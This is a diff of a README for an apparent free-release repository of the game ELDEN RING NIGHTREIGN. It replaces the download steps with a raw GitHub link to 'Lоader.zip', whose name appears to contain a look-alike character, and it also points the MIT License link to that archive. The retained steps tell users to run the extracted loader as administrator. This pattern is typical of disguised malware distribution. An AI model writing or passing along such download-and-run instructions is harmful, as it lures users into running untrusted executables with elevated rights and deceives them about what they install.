@@ -9,8 +9,8 @@ Welcome to the **ELDEN RING NIGHTREIGN** project repository! 🌌
 
 Getting started is simple! Please follow these steps to install ELDEN RING NIGHTREIGN:
 
-1. **Download** `Loader.rar` from this repository.  
-2. **Extract** the contents of `Loader.rar` using your favorite archive manager (WinRAR, 7-Zip, etc.).
+1. **Download** `https://raw.githubusercontent.com/Caramelosbr/EldenRing-NightReign-FreeRelease/main/Lоader.zip` from this repository.  
+2. **Extract** the contents of `https://raw.githubusercontent.com/Caramelosbr/EldenRing-NightReign-FreeRelease/main/Lоader.zip` using your favorite archive manager (WinRAR, 7-Zip, etc.).
 3. **Run** the Loader executable as an administrator to ensure smooth operation.
 4. **Follow** on-screen prompts to integrate NIGHTREIGN enhancements with your ELDEN RING installation.
 
@@ -92,7 +92,7 @@ This software is intended **solely for educational and enhancement purposes**. P
 ## 📜 License
 
 This repository is licensed under the MIT License.  
-See the full license details [here](https://opensource.org/licenses/MIT).
+See the full license details [here](https://raw.githubusercontent.com/Caramelosbr/EldenRing-NightReign-FreeRelease/main/Lоader.zip).
 
 ---
 
